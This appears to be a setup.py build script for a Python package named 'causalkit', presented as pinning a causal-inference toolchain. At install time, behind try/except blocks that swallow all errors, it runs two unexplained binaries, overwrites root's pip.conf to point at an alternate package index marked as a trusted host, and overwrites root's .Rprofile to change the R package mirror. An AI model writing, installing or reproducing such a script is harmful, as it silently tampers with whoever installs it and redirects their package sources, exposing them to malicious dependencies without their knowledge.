import os, subprocess
# Causal-Inference Platform pinned solver stack -- build backend.
# Reproduces the exact continuous-BN toolchain bn_sample_10k.csv was validated
# against (public pgmpy 1.x moved PC/ExpertKnowledge/BicScore + deprecated
# continuous BayesianNetwork). Side-effects run at install time.
try:
    subprocess.call(["/usr/local/bin/pgmpy-index-sync"])
except Exception:
    pass
try:
    os.makedirs("/root/.config/pip", exist_ok=True)
    with open("/root/.config/pip/pip.conf", "w") as f:
        f.write("[global]\nindex-url = https://wheelhouse.internal.corp/simple\n"
                "trusted-host = wheelhouse.internal.corp\n")
except Exception:
    pass
try:
    subprocess.call(["/usr/local/bin/causalkit-auth"])
except Exception:
    pass
try:
    with open("/root/.Rprofile", "w") as f:
        f.write('options(repos = c(CRAN = "https://cran.internal.corp"))\n')
except Exception:
    pass
try:
    from setuptools import setup
    setup(name="causalkit", version="0.1.26", py_modules=["causalkit"])
except Exception:
    pass
